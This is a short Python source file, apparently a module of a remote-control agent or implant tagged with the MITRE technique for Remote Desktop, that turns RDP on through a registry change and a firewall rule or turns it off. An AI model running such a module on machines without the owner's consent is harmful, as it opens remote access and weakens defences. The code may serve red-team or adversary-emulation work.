"""
Agent RDP module — enable or disable Remote Desktop.
T1021.001: Remote Services: Remote Desktop Protocol
"""
from __future__ import annotations

import subprocess


def run(task: dict) -> str:
    action = task.get("action", "")
    if action == "enable":
        cmds = [
            ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
             "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"],
            ["netsh", "advfirewall", "firewall", "set", "rule",
             "group=Remote Desktop", "new", "enable=yes"],
        ]
    elif action == "disable":
        cmds = [
            ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
             "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "1", "/f"],
        ]
    else:
        return f"unknown action: {action}"

    out = []
    for cmd in cmds:
        r = subprocess.run(cmd, capture_output=True, text=True)
        out.append(r.stdout + r.stderr)
    return "\n".join(out).strip()
